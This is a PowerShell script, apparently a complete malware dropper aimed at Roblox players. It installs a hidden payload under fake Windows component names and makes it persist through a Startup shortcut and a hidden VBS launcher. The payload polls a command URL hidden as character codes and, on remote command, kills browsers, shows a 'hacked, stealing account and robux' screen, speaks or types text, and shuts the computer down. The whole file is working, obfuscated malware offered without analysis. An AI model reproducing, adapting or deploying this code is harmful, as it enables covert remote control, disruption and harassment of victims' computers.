# --- CONFIGURACIÓN DE RUTAS ---
$dir = "$env:LOCALAPPDATA\WinSystem"
if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force }
$psFile = "$dir\TaskHostWin.ps1"
$vbsFile = "$dir\Launcher.vbs"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinSystemUpdate.lnk"

# --- 1. MOTOR DE CONTROL (TaskHostWin.ps1) ---
$c1 = '$u = 104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,112,111,108,103,97,116,105,122,47,108,111,120,47,109,97,105,110,47,99,111,110,116,114,111,108,46,116,120,116; $controlUrl = -join ($u | % {[char]$_})' + "`n"
$c2 = '$windowTitle = "*Roblox*"' + "`n"

$c3 = 'function MostrarHacker($l1, $l2) {' + "`n"
$c4 = '    $b64 = "ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAhISEgQUxFUlRBIERFIFNJU1RFTUEgISEhDQogICAgICAgICAgICAgICAgPT09PT09PT09PT09PT09PT09PT09PT09PT09DQoNCiAgICAgICAgICAgICAgICAgIEhBQ0tFQURPIFBPUiBQRUtVIE1FWElDTw0KDQogICAgICAgICAgIEdSQUNJQVMgUE9SIEpVR0FSIEVOIE5VRVNUUk9TIFNFUlZFUlMgUElSQVRBUw0KDQogICAgICAgICAgICAgICAgIFJPQkFORE8gQ1VFTlRBIFkgUk9CVUtTLi4uLg0KDQogICAgICAgICAgICAgICAgPT09PT09PT09PT09PT09PT09PT09PT09PT09DQogICAgICAgICAgICAgICAgRVNUQURPOiBDT01QUk9NRVRJRE8gKDEwMCUpDQogICAgICAgICAgICAgICAgUEFURU5URSBNWCAyMDI2IC0gTE9YIE5FVA0KDQogICAgICAgICAgICAgICAgICAgICIgKyAkbDEgKyAiDQogICAgICAgICAgICAgICAgICAgICIgKyAkbDIgKyAiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA=="' + "`n"
$c5 = '    $ascii = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))' + "`n"
$c6 = '    $pathS = "$env:TEMP\syserr.ps1"' + "`n"
$c7 = '    $cmd = "$Host.UI.RawUI.BackgroundColor=''DarkBlue'';$Host.UI.RawUI.ForegroundColor=''White'';Clear-Host;Write-Host ''$ascii'';for(`$i=0;`$i -lt 8;`$i++){[Console]::Beep(400,100);[Console]::Beep(600,100)};Read-Host ''CONEXION PERDIDA''"' + "`n"
$c8 = '    Set-Content -Path $pathS -Value $cmd -Force' + "`n"
$c9 = '    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass", "-File", "`"$pathS`"" -WindowStyle Maximized' + "`n"
$c10 = '}' + "`n"

$c11 = 'while($true) {' + "`n"
$c12 = '    try {' + "`n"
$c13 = '        $raw = (Invoke-WebRequest -Uri $controlUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content' + "`n"
# Filtro para ignorar líneas que empiezan con #
$c14 = '        $lineas = $raw -split "`n" | Where-Object { $_ -and $_.Trim() -notlike "#*" }' + "`n"
$c15 = '        $partes = $lineas[0].Trim() -split ''\|''' + "`n"
$c16 = '        $comando = $partes[0]' + "`n"
$c17 = '    } catch { $comando = "OFF" }' + "`n"
$c18 = '    if ($comando -eq "OFF") { Start-Sleep -Seconds 30; continue }' + "`n"
$c19 = '    $roblox = Get-Process | Where-Object { $_.MainWindowTitle -like $windowTitle }' + "`n"
$c20 = '    if ($roblox) {' + "`n"
$c21 = '        switch ($comando) {' + "`n"
$c22 = '            "INFO" { $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content; Start-Process powershell.exe -ArgumentList "-Command", "Write-Host ''IP: $ip'' -Fore Green; Read-Host" }' + "`n"
$c23 = '            "VOICE" { (New-Object -ComObject SAPI.SpVoice).Speak($partes[1]) }' + "`n"
$c24 = '            "GHOST" { Start-Process notepad; Start-Sleep -Seconds 2; $w = New-Object -ComObject WScript.Shell; $partes[1].ToCharArray() | % { $w.SendKeys($_); Start-Sleep -Milliseconds 80 } }' + "`n"
$c25 = '            "HACK" { Get-Process chrome, msedge, firefox -ErrorAction SilentlyContinue | Stop-Process -Force; MostrarHacker $partes[1] $partes[2]; shutdown.exe /s /t 60 /c "PEKU MEXICO HACK" }' + "`n"
$c26 = '            "MINIMIZE" { (New-Object -ComObject Shell.Application).MinimizeAll() }' + "`n"
$c27 = '        }' + "`n"
$c28 = '    }' + "`n"
$c29 = '    Start-Sleep -Seconds 15' + "`n"
$c30 = '}'

$psContent = $c1+$c2+$c3+$c4+$c5+$c6+$c7+$c8+$c9+$c10+$c11+$c12+$c13+$c14+$c15+$c16+$c17+$c18+$c19+$c20+$c21+$c22+$c23+$c24+$c25+$c26+$c27+$c28+$c29+$c30

# --- 2. LANZADOR Y PERSISTENCIA ---
$vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.Run "powershell.exe -ExecutionPolicy Bypass -File ""' + $psFile + '""", 0, False'
Set-Content -Path $psFile -Value $psContent -Force
Set-Content -Path $vbsFile -Value $vbsContent -Force
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($startupPath); $Shortcut.TargetPath = "wscript.exe"; $Shortcut.Arguments = "`"$vbsFile`""; $Shortcut.Save()
Start-Process "wscript.exe" -ArgumentList "`"$vbsFile`""
